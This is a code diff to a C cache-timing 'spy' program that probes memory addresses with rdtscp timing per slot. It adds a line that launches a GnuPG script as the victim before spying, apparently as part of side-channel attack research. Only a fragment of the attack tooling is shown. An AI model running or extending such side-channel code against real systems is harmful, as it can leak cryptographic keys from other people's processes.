@@ -26,13 +26,15 @@ void spy(void **addrs, uint32_t num_addrs, uint16_t *results,
          uint64_t threshold) {
   uint32_t total_num_results = num_results * num_addrs;
   for (uint32_t slot_idx = 0; slot_idx < total_num_results; slot_idx += 3) {
+    uint64_t start_time = rdtscp();
 #if defined(WITH_TIMING) && WITH_TIMING
     for (uint32_t addr_idx = 0; addr_idx < num_addrs; addr_idx++) {
       results[slot_idx + addr_idx] = probe(addrs[addr_idx]);
     }
-    wait(wait_cycles);
+    do {
+      wait(wait_cycles);
+    } while (rdtscp() - start_time < time_slot_size);
 #else
-    uint64_t start_time = rdtscp();
     for (uint32_t addr_idx = 0; addr_idx < num_addrs; addr_idx++) {
       results[slot_idx + addr_idx] |= probe(addrs[addr_idx]) < threshold;
     }
@@ -104,6 +106,7 @@ int main(int argc, char **argv) {
 #endif
 
   fprintf(stderr, "\t|||  ...starting spy...  |||\n");
+  system("./run-gpg.sh &");
   spy(addrs, config.num_addrs, results, config.time_slots, config.wait_cycles,
       config.time_slot_size, config.threshold);
   fprintf(stderr, "\t|||   ...closed spy...   |||\n");
@@ -122,7 +125,9 @@ int main(int argc, char **argv) {
   }
   fclose(report);
   free_config(&config);
+  #if defined(WITH_EV) && WITH_EV
   arr_free(&conflict_set);
+  #endif
   return 0;
 report_error:
   fclose(report);
